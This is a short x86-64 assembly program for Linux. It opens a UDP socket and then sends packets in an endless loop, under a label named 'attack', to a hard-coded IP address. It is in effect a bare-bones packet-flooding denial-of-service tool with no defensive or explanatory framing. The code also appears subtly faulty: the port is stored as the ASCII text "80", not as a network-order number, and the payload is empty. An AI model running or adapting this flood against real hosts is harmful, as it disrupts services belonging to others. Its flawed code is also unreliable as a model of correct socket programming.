section .text
	global _start

	%assign SYS_SOCKET	41
	%assign SYS_SENDTO	44

	%assign AF_INET		2
	%assign SOCK_DGRAM	2
attack:
	mov	rax, SYS_SENDTO
	mov	rsi, data
	mov	rdx, size
	mov	r8,  sin
	mov	r9,  16
	syscall
	jmp	attack
_start:
	mov	rax, SYS_SOCKET
	mov	rdi, AF_INET
	mov	rsi, SOCK_DGRAM
	mov	rdx, 0
	syscall

	mov	rdi, rax
	call	attack

	mov	rax, 60
	mov	rdi, 0
	syscall

section .data
data:
	db	""
size	equ 	$ - data
sin:
	dw	AF_INET
	db	"80"
	db	0x4a, 0x4a, 0x4a, 0x4a
	db	0, 0, 0, 0, 0, 0, 0, 0

section .bss
